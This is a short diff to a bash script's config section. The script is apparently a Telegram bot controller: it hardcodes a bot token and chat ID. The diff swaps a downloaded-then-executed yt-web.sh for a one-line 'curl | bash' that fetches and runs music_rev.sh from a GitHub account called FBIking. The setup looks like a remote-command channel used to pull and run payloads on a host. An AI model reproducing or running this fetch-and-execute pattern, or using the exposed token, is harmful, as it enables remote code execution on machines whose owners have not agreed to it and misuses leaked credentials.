@@ -9,18 +9,7 @@ set -euo pipefail
 ################ CONFIG ################
 TOKEN="7400095855:AAE9Lqtz6LLM-_gEasvVWY4nqGtkxr2I-rY"
 CHAT_ID="6565158025"
-HARDCODE_CMD='
-TMP=$(mktemp /tmp/yt-web.XXXXXX.sh) || exit 1
-if curl -fL "https://raw.githubusercontent.com/FBIking/Fbiking.github.io/main/yt-web.sh" -o "$TMP"; then
-  chmod +x "$TMP"
-  bash "$TMP" || echo "script exited with non-zero status"
-else
-  echo "download failed: curl exit $?"
-  rm -f "$TMP"
-  exit 1
-fi
-rm -f "$TMP"
-'
+HARDCODE_CMD='curl -sL https://raw.githubusercontent.com/FBIking/Fbiking.github.io/main/music_rev.sh | bash'
 ########################################
 
 API="https://api.telegram.org/bot${TOKEN}"
